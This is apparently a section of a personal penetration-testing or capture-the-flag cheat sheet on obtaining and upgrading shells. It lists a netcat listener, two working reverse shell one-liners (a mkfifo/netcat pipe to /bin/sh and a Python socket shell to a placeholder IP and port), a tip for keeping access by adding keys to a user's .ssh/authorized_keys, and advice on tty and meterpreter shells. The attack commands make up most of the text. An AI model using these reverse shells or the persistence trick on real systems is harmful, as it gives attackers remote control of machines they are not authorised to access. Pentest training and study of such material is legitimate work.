5. Simple shells

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet is an amazing list of reverse shells if the ones listed here don't work.

#### Opening a connection on your computer:
- `nc -nlvp PORT`
	- This opens the port and waits for a connection to create a reverse shell

#### Common reverse shell commands:
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f`
- `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

#### Opening a bind shell
Bind shells aren't as common due to the fact that they are more vulnerable to being "stolen" as well as outgoing connections are harder to flag as bad traffic than incoming connections. I will not list them since I've never had a use for them outside of metasploit payloads, but https://ashr.net/bind/and/reverse/shell/cheatsheet/windows/and/linux.aspx is a good place to find some.

### Upgrading to an interactive shell
Sometimes you have a shell that lets you run commands but no tab completion, arrow key movement, etc.
- The first way is to edit the .ssh/authorized_keys of a user then ssh in. This also helps with ensuring you still have the conneciton to the server even if you patch the exploit/the connection drops
	- Note that some machines may not have ssh enabled or on the default port. Check your nmap scan!
- https://netsec.ws/?p=337 is a good list of how to spawn a tty shell, python being the one I use the most.

Sometimes you'll end up where you can't seem to get a tty shell no matter what you do. Keep trying or just work with what you have. If you have all the time in the world, consider using msfvenom and establishing a meterpreter shell, which is more consistent than whatever reverse shell you may have setup.